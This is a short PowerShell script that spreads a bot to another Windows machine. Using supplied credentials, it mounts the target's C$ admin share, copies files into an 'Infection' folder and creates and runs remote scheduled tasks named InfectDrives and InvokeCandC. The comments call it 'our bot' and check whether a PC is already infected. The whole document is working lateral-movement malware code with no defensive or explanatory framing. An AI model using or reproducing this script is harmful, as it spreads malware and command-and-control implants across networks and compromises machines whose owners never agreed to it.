Param (
     [Parameter(Mandatory=$True, ValueFromPipeline=$True)][System.string]$hostname,
     [Parameter(Mandatory=$True, ValueFromPipeline=$True)][System.string]$username,
     [Parameter(Mandatory=$True, ValueFromPipeline=$True)][System.string]$password
)    
try {
	# The name of the folder where the files for our bot will live
	$infectiondir = "Infection"
	# Infection Exclusion Flag
	$infectionexflag = "Infection.Not"
	#unc path 
	$uncpath = "\\" + $hostname + "\c$"
	# Infection exclusion path
	$infectionexpath = Join-Path $uncpath $infectionexflag
	# infection path
	$infectionpath = Join-Path $uncpath $infectiondir
	$infectionpath
	#BUILD CONNECTION TO REMOTE
	net use /delete * /y
	net use $uncpath /user:$username $password
	net use
	#if the PC isn't infected
	#if((!(Test-Path $infectionpath)) -and (!(Test-Path $infectionexpath))) {
		# make directory 
		mkdir $infectionpath
		# System Drive letter
		$localsysdrive = (Get-ChildItem env:systemdrive).value
		#localinfection path
		$localinfectionpath = Join-Path $localsysdrive $infectiondir
		# copy the files from drive to OS disk
		copy "$localinfectionpath\*" $infectionpath
		# create Infect-Drives scheduled task and run it
		schtasks /create /xml c:\infection\InfectDrives.xml /tn InfectDrives /u $username /p $password /s $hostname
		schtasks /run /TN InfectDrives /u $username /p $password /s $hostname
		# create Invoke-CandC scheduled task and run it
		schtasks /create /xml c:\infection\InvokeCandC.xml /tn InvokeCandC /u $username /p $password /s $hostname
		schtasks /run /TN InvokeCandC /u $username /p $password /s $hostname
	#}
} catch {

}